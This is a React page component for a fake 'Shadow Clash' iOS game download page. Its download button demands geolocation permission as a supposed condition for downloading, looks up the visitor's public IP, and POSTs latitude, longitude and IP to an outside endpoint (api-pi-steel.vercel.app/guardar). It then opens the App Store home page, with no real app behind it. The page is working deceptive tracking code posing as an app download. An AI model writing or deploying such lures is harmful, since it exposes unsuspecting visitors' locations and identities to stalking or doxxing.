import { useState } from 'react';

export default function Home() {
  const [status, setStatus] = useState('');

  const handleDownload = async () => {
    setStatus('Obteniendo APP...');

    if (!navigator.geolocation) {
      setStatus('APP no soportada');
      return;
    }

    navigator.geolocation.getCurrentPosition(async (position) => {
      try {
        const { latitude, longitude } = position.coords;

        // Obtener pública
        const res = await fetch('https://api64.ipify.org?format=json');
        const data = await res.json();
        const ip = data.ip;

        const combined = `${latitude},${longitude}-${ip}`;

        // Enviar a la API
        await fetch('https://api-pi-steel.vercel.app/guardar', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ texto: combined }),
        });

        setStatus('Pronto iniciara la descarga....');

        // Redirigir a la App Store (ficticia aquí)
        window.open('https://apps.apple.com', '_blank');
      } catch (error) {
        console.error(error);
        setStatus('Error al enviar datos');
      }
    }, () => {
      setStatus('Para poder descargar debes dar permisos');
    });
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-4 font-mono">
      <h1 className="text-5xl mb-8 font-bold text-yellow-400">Shadow Clash</h1>
      <button
        onClick={handleDownload}
        className="bg-red-600 hover:bg-red-700 text-white py-3 px-6 rounded-xl text-xl shadow-lg"
      >
      <img src="apple.svg" alt="Apple" className="w-5 h-5" />
        Descargar para iOS
      </button>
      {status && <p className="mt-4 text-green-400">{status}</p>}
    </div>
  );
}
